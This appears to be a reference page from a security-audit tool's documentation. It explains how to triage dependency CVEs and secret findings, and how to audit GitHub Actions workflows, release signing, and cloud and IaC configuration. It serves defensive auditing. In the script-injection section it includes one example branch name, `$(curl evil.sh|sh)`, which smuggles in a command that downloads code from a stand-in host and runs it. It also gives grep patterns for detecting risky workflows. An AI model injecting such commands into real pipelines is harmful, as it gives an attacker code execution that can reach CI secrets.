# Supply chain, CI/CD and cloud

The scanners produce this half of the report — usually the *majority* of it by count. That makes
triage, not detection, the skill: a 200-CVE list nobody acts on is worth less than the five you
proved matter. This file is the decision method for dependency findings and secrets, plus the
CI/IaC classes no scanner in the belt covers well.

> Parts adapted from Cloudflare's [security-audit skill](https://github.com/cloudflare/security-audit-skill) (MIT).

---

## Dependency CVEs: what to do with 200 of them

`scan` already correlates across tools (one advisory seen by trivy, osv-scanner and grype is one
finding whose `sources[]` names all three) and ranks by a composite `risk` = severity ⊕ EPSS ⊕
CISA KEV. **Work the list in `risk` order and stop when the rest are below your bar** — that is
what the ranking is for.

> **Never open a dossier per CVE.** The grounding packet exists to show you code along a path;
> an advisory has no path, and the question is not "does this code do something dangerous" but
> "does my deployment reach it". A per-CVE fan-out spends a subagent on something the ranking
> already answered — on one monorepo that was 190 of 882 open candidates, a quarter of the
> adjudication budget bought with nothing to read. So `verify`, `revalidate` and the
> `orchestrate` fan-out leave advisories out by default (`--surface code+supply`; `--surface all`
> brings them back), and you work this half from the report instead.

### The report already groups them

`render` rolls the advisories up **one row per package** in §8 of `REPORT.md` — the unit you
actually upgrade — with its priority, worst severity, installed versions, advisory count, main
advisory, the version to upgrade to, runtime or not, target and status, capped at 100 rows.
`minimatch` with seven advisories is one row and one upgrade, not seven decisions. The individual
CVEs stay in `findings.json` under their own ids; list them with `paths --surface deps`.

Neither gate counts an `open` tail: `render` and `check --semantic` both fire only on unread
HIGH/CRITICAL candidates in code you wrote (the semantic gate reports the open advisories as
information). Leaving the tail open below your bar is the prescribed outcome. When you do settle
rows, do it per package from a reachability table — runtime vs dev/build; the dev-only question
below is the one that closes most of them — never one CVE at a time. The narrative and the
remediation draft see them the same way: one line per package.

### The prioritization ladder

The composite score encodes a CISA-SSVC-style ordering: **exploitation status first,
exploitability second, impact third.** Concretely (the labelled reference ranking in
`tests/fixtures/calibration/reference-triage.json` pins this, and
`tests/scoring-calibration.test.ts` holds the engine to it):

1. **KEV** — in CISA's Known Exploited Vulnerabilities catalog. Known-exploited beats everything;
   a MEDIUM CVSS 6.5 in KEV outranks a CRITICAL 9.1 that isn't. Treat as an operational deadline,
   not a backlog item.
2. **EPSS** — probability of exploitation in the next 30 days. High EPSS on a MEDIUM outranks a
   low-EPSS CRITICAL: CVSS 9.3 with EPSS 0.03 ranks *below* CVSS 6.1 with EPSS 0.97.
3. **CVSS / severity** — the tie-break, not the sort key. It measures worst-case impact in a
   generic deployment, which is rarely yours.

Under `--offline`/`--no-enrich` you get severity-only ranking; say so in the report, because the
top of that list is a different list.

### Then apply the five questions the score can't answer

- **Is the vulnerable code path actually reachable?** The strongest reduction available. Grep for
  the symbol the advisory names, not the package: a `lodash` prototype-pollution CVE in `merge`
  is irrelevant if you only import `get`. For Go, `govulncheck` answers this mechanically —
  weight its findings above a plain lockfile match.
- **Direct or transitive?** A transitive dependency you can't upgrade without the parent is a
  different work item (pin/override/fork) from a direct bump. Both are real; the fix differs.
- **Dev-only?** `devDependencies`, `[dev-dependencies]`, `test`/`provided` scope. Not shipped ⇒
  not exploitable in production, but **still exploitable against your CI** if it runs on
  untrusted input (see below). Refute it with `outside-usage` only once you have checked that it
  does not; otherwise downgrade the severity and keep it.
- **Does the CVSS vector match your deployment?** `AV:N` on a service that only listens on
  localhost; `PR:H` on something no attacker reaches; `UI:R` on a headless daemon. Rate what your
  deployment exposes.
- **Is there a fixed version?** If not, the finding is real and the remediation is compensating
  controls — say that instead of filing an impossible upgrade.

A dependency finding you keep should carry, in one line: the package and version, the reachable
symbol (or "reachability unconfirmed"), the fixed version (or "no fix"), and the KEV/EPSS reason
it ranks where it does.

### Version-merged advisories

The correlator collapses one advisory reported at several versions or lockfiles into a single
finding whose `locations[]` keeps each `{file, line, version}`. Fix the whole cluster, and check
that every location moves — a monorepo that bumps one workspace and not the other looks fixed and
isn't.

### The question a CVE scanner cannot answer

Every adapter above answers *does this package have a known advisory?*. That misses the attack that
actually happens now: a package that was never vulnerable because it was **hostile from its first
publish**. There is no CVE for it and there never will be — the class is found by behaviour, not by
disclosure. `guarddog` covers the mechanical half (install-time code execution, typosquat distance,
fetch-at-install). The other half is a judgment about the *project*:

| signal | why it matters |
|---|---|
| Single or anonymous maintainer | one account compromise is the whole supply chain |
| Unmaintained or archived | no one will ship the fix; check issues for an unanswered security report |
| Low popularity relative to its peers | fewer eyes have read what you are installing |
| High-risk features — FFI, deserialization, executing third-party code | the blast radius if it *is* taken over |
| A CVE history out of proportion to its size | a pattern, not an accident |
| No `SECURITY.md` or contact | nobody can report the next one responsibly |

None of these is a finding on its own. Several together, on a package that runs at install time or
handles untrusted input, is a **hardening note with a name** — and occasionally the most useful
paragraph in the report.

### Secret findings: verified beats plausible

`gitleaks` and `kingfisher` answer "does this look like a credential?". `trufflehog --only-verified`
calls the provider and answers whether it still works. Rate them apart: a **verified** key is an
incident with a clock on it (rotate first, then find how it got committed — history, CI logs,
images); the same string already rotated is a hygiene note. Filing both as `high` is how a rotation
backlog buries a live breach.

## Secrets

The most time-sensitive class in the report. A secret finding is not a backlog item; it is an
incident with a clock.

**Order of operations, always:** (1) determine whether it is live, (2) **rotate at the source**,
(3) only then clean the repository. Rotating last is the common mistake — history rewriting is
slow and public, and it tells an attacker exactly what to go looking for.

- `verified: true` on a finding means a scanner actively confirmed the credential works
  (kingfisher, TruffleHog verification). That is an active compromise, not a hygiene issue.
- **Git history matters more than the working tree.** A secret removed in a later commit is still
  in every clone. `gitleaks` scans history; a grep of HEAD does not.
- **Triage the shape before the value.** A high-entropy string in a test fixture, an
  `.env.example`, a docs snippet or a public key is not a secret. Trivy and gitleaks both hit
  these; that's the expected false-positive profile, not a scanner defect.
- **Rate by what the credential opens**, not by its type: a read-only analytics key is LOW; a
  cloud access key or a signing key (`SECRET_KEY`, `APP_KEY`, `secret_key_base`) is CRITICAL
  because it converts into session forgery or full account access.
- After rotation, ask *why* it was committed — a missing `.gitignore` entry, a pre-commit hook
  that isn't installed, or a config pattern that makes committing the easy path. That's the root
  cause and it belongs in `NARRATIVE.json`.

## CI/CD — the class with the worst severity-to-attention ratio

Almost nothing in the tool belt looks here, and the findings are frequently CRITICAL: CI holds
the credentials to production and runs code on every push.

**GitHub Actions, in descending severity:**

- **`pull_request_target` + checking out the PR head.** `pull_request_target` runs with the base
  repo's secrets **and** write token. Combined with
  `actions/checkout` of `github.event.pull_request.head.sha` (or `head.ref`) and *any* step that
  executes repo content — a build, a test, an `npm install` with lifecycle scripts, a linter with
  a repo-local config — an untrusted fork PR achieves arbitrary code execution with your secrets.
  This is the single highest-value grep in the class:
  ```
  rg -n "pull_request_target" -A 30 .github/workflows/ | rg -n "checkout|head\.(sha|ref)"
  ```
- **Script injection via `${{ }}`.** Anything from `github.event` interpolated into a `run:`
  block is attacker-controlled text pasted into a shell: `github.event.issue.title`,
  `pull_request.title`/`body`, `comment.body`, `head_ref`, `commit.message`, `review.body`. A
  branch named `$(curl evil.sh|sh)` executes. The fix is passing through `env:` and quoting
  `"$VAR"`, not escaping.
  ```
  rg -n 'run:' -A 5 .github/workflows/ | rg -n '\$\{\{ *github\.(event|head_ref)'
  ```
- **Unpinned third-party actions.** `uses: some/action@v3` follows a mutable tag; the owner (or
  anyone who compromises them) can change what it runs. Pin to a full commit SHA. Rate by what
  the workflow's token can do.
- **Over-broad `permissions`.** Absent or `write-all` gives the default `GITHUB_TOKEN` write
  access to contents, packages and deployments. `permissions: read-all` plus per-job grants is
  the baseline.
- **Self-hosted runners on a public repo.** Fork PRs execute on your infrastructure, and
  non-ephemeral runners leak state between jobs.
- **Secrets reachable from a fork-triggered workflow** at all — check the trigger, not just the
  step.
- **Artifact and cache poisoning** — a cache key an untrusted job can write, restored into a
  trusted one.

**Package-manager lifecycle:** `postinstall`/`preinstall`/`prepare` scripts run arbitrary code on
`npm install`, in CI and on every developer machine. Audit them in direct dependencies, and
prefer `--ignore-scripts` in CI where the build allows it. Python `setup.py` and Ruby
`extconf.rb` are the same shape.

**Dependency confusion and typosquatting** — an internal package name that also resolves on the
public registry, a missing scope, a registry configuration that falls back to public. Check for
lockfile integrity (`integrity`/hashes present and verified) and whether the private registry is
the *only* source for internal scopes.

## Release, signing, update and plugin integrity

The CI section asks who can run code inside a privileged job. This one follows the artifact
*after* the build: is what a user installs provably what the reviewed source produced? Work it
backward — from the promoted digest or the installed update to every input, worker, cache, test
result and authorization decision it passed through. `investigate --lens release` points the
region worklist at updater, plugin-loader and signing code.

- **Codegen and vendored provenance.** Generated clients, schemas compiled to code, vendored
  archives, binary blobs and translation bundles ship without the review a source change gets.
  Regenerate locally and diff against what is committed, then ask who controls the generator's
  input.
- **Build-context inclusion.** The build context is wider than the release: a `.dockerignore`
  without `.env`, `.git` or `*.pem`, a `COPY . .` ahead of any exclusion, a package `files` list
  or `MANIFEST.in` that sweeps in fixtures. A finding only once the shipped image or tarball
  actually carries a working credential, private data or privileged config — unpack it and look.
- **Mutable inputs.** Branches, tags, floating base-image tags, `curl | sh` tool installs,
  unverified submodules, remote includes. It needs a lower-trust writer who can change the content
  and a path into trusted output; a reproducible build is not an authentic one.
- **Cache and artifact mixing across trust levels.** A fork-triggered job populates a cache key,
  artifact or shared workspace that a release job later restores and runs or ships. Check the key
  namespace, the producer's identity, and whether promotion re-resolves by name.
- **Automation identity.** Job tokens, deploy keys and OIDC roles scoped wider than the operation,
  especially when a job input picks the target. Breadth alone is a hardening note; a reachable
  privileged action is the finding.
- **Digest binding from build to promotion.** Test, review, signature and publication must all
  name the *same* immutable digest. Every re-tag, repack, multi-arch merge or "promote `:latest`"
  step is a substitution point.
- **Signing and attestation identity policy.** "Signed" is not a control; "signed by the expected
  identity" is. A `cosign verify` with no pinned certificate identity and OIDC issuer accepts any
  Sigstore signer; SLSA provenance must be checked for builder, source repository, ref and
  workflow, not merely for a valid signature. Expired or revoked keys and a missing attestation
  must fail closed.
- **Updater metadata.** An updater that authenticates the payload bytes but not version, channel,
  platform, target path or expiry is open to **rollback** (serve an older, signed, vulnerable
  release) and **freeze** (serve stale metadata forever). Look for a monotonic version check,
  metadata expiry, metadata and payload bound to one transaction, and an atomic install.
- **Plugin and extension trust expansion.** An extension obtaining host authority beyond its
  declared scope, one publisher able to take over another's identifier, install or update hooks
  running before the signature and capability checks. Installing arbitrary plugins as the same
  user, by design, is not a boundary.

Rate each with a named chain: lower-trust actor → input they control → trusted consumer → result
(an unauthorized publication, code in a shipped artifact, a disclosed secret). Branch protection,
environment approvals, registry settings and signing-service policy live outside the repository:
when one is decisive, the finding is `needs-human` naming that fact
([severity-and-discipline.md](severity-and-discipline.md)). Reproduce with a fixture repository or
a local registry; never publish or alter a real release.

## IaC and cloud

Checkov, trivy misconfig and hadolint cover the catalog; your job is to rate them against the
deployment, because these findings are the most context-dependent in the report.

- **Network** — `0.0.0.0/0` on anything that isn't a load balancer's 443. Rate by what's behind
  it: `0.0.0.0/0` on 22 or 3306 is HIGH; on a public web tier's 443 it is nothing.
- **IAM** — `"Action": "*"` / `"Resource": "*"`, `iam:PassRole` without a condition, a trust
  policy with a wildcard principal, long-lived access keys where a role would do.
- **Storage** — public buckets and snapshots, missing encryption on data at rest, public AMIs.
- **Instance metadata** — IMDSv1 still enabled is what turns a MEDIUM SSRF into credential theft
  (see [attack-classes.md](attack-classes.md)); enforcing IMDSv2 is the compensating control.
- **Kubernetes** — `privileged: true`, `hostNetwork`/`hostPID`, `hostPath` mounts,
  `allowPrivilegeEscalation`, running as root, `automountServiceAccountToken` on pods that don't
  need the API, and RBAC `ClusterRole` with `*` verbs.
- **Terraform state** — state files contain plaintext secrets; check the backend is remote,
  encrypted and access-controlled, and that state isn't committed.
- **Dockerfiles** — secrets in `ENV`/build args baked into layers, `latest` base images, `USER`
  never dropped from root, `ADD` of a remote URL.

The catalog stops at misconfigurations a rule can match. The classes below are about **who the
deployed thing is and who can reach it**, and no checker sees them; hunt them with
`investigate --lens cloud` (stack hiding places: [frameworks.md](frameworks.md) §Cloud /
Kubernetes / IaC).

- **Workload identity overreach** — a pod, function or node role that can act beyond its job, where
  request input selects the target (a bucket name, an account id, a tenant). Broad policy is a
  finding only when lower-trust input reaches the extra authority.
- **Cross-account role confusion** — trust policies, federation and token exchange that accept a
  claim not bound to the intended account, audience, repository or workload: a missing external
  id, a CI OIDC trust on `repo:org/*`, a confused-deputy role.
- **App authorization delegated to cloud metadata or labels** — the app trusts forwarded identity
  headers, resource tags, labels or account ids it cannot prove came from the control plane or a
  trusted proxy. Cloud IAM and application authorization are two separate checks.
- **Management-plane reachability** — admin, debug, metrics or actuator endpoints, the kubelet, a
  container-runtime socket or an internal API bound to every interface or published by an ingress
  or load-balancer annotation. A repo-defined public route to a sensitive handler is confirmable;
  a merely absent network policy is `needs-human`.
- **Proxy and mesh bypass** — a backend accepts identity headers or an mTLS subject from peers
  outside the ingress or sidecar; an alternate port, health or legacy path skips the mesh; nothing
  strips the header; the service fails open when the proxy is absent.
- **Admission-path inconsistencies** — policy enforced on Deployments but not on Jobs, CronJobs,
  upgrade or restore hooks, or a second controller that creates the same objects.
- **Label and namespace selector trust** — network, admission or workload-identity policy keyed on
  labels, annotations or namespaces that a lower-trust principal can set.
- **Config precedence drift** — chart defaults, overlays, env vars, flags or feature gates that
  switch off auth, TLS or tenant scoping in one environment. Render each maintained environment
  and diff: the base file is not what runs.
- **Credential renewal fallback** — when a secret mount or token refresh fails, does the app keep
  stale credentials alive, or drop to a weaker identity mode (anonymous, a static key)?
- **Signed and presigned URL policy** — are expiry, method, object key or prefix, content type and
  principal bound? A long expiry or a caller-chosen prefix turns a download link into a grant on
  the bucket; check list and write paths, not just reads.
- **Event-source identity** — a function trusting body fields (`source`, `account`, `userId`)
  without verifying the provider-signed envelope, the subscription or topic, and replay. Compare
  push, retry and dead-letter paths.
- **Edge/origin mismatch** — the edge worker enforces auth, tenant or cache policy the origin
  doesn't, and the origin is reachable directly or through a fallback; or the cache key ignores the
  header authorization depends on.

**Rate these against the deployment model, always.** "Rate-limiting belongs at the CDN" and
"this bucket is a public asset host" are valid architectures. A misconfiguration finding with no
statement about what it exposes is a checklist item, not a finding. A manifest states intent, not
live fact: establish which environment consumes it and what overlays change it, and when the
decisive fact (account policy, network attachment, runtime admission) isn't in the repository, the
finding is `needs-human` naming it — neither assumed present nor absent.

## SBOM

With `syft` installed, `scan` emits `sbom.cdx.json` (CycloneDX) into the run directory and
feeds it to grype (`sbom:` mode) and package-checker (`--source`) instead of re-walking the tree.
Beyond speed, it is the artifact that answers "were we affected?" the next time a Log4Shell-class
advisory lands — attach it to the report. It is an intermediate to `clean` and to `audit` without
`--keep-work`, so copy it out first.

## Per-tool false-positive profiles

Every scanner has a signature noise pattern. Knowing it is most of triage. Frozen real outputs
for all of these live in `tests/fixtures/tool-output/` if you want to see the shapes.

| tool | expected noise | what still deserves a read |
|---|---|---|
| **Bandit** | `B101` (assert used), `B404`/`B603` (imports subprocess), `B311` (random) outside a security context; `B608` fires on *any* SQL f-string including safe ones | `B602` `shell=True`, `B301` pickle, `B506` `yaml.load` |
| **gosec** | `G104` unhandled error, `G304` file path from a variable, `G107` URL from a variable — all flood | `G204` subprocess with tainted args, `G402` TLS verification off, `G404` `math/rand` for tokens |
| **Semgrep** (community rules) | `generic.secrets` on high-entropy non-secrets; framework rules that don't know your version | anything with a taint-mode rule and a concrete sink |
| **Trivy secrets** | `.env.example`, fixtures, docs, public keys | anything in git history, anything `verified` |
| **gitleaks** | same, plus base64 blobs and UUIDs | history hits — the working tree is the least interesting place |
| **hadolint** | `DL3008`/`DL3018` (pin apt/apk versions) are style at most | `DL3002` running as root, secrets in `ENV` |
| **checkov** | Terraform modules whose values come from variables it can't resolve | anything with a literal `0.0.0.0/0`, `*`, or `public` |
| **osv/grype/trivy deps** | high volume, near-zero false positives on *presence* — the noise is **relevance**, not correctness | KEV and high-EPSS entries, and anything you can show is reachable |

A scanner finding lands `open` like any other candidate and goes through the same
`[file:line]` gate. Corroboration (`sources[]` longer than one) is a confidence prior for verify,
never a verdict.

## What the tool belt does *not* cover

Say this in the report, because a reader will assume otherwise: there is **no DAST, no fuzzing,
no authenticated crawling, no runtime testing**, and no coverage of authorization or business
logic. Everything in [attack-classes.md](attack-classes.md) is manual by construction. A clean
scanner run means the known-pattern layer is clean — nothing more.

---

Related: [tools.md](tools.md) (what each scanner is and how it runs) ·
[severity-and-discipline.md](severity-and-discipline.md) (rating) ·
[adjudication.md](adjudication.md) (the verdict).
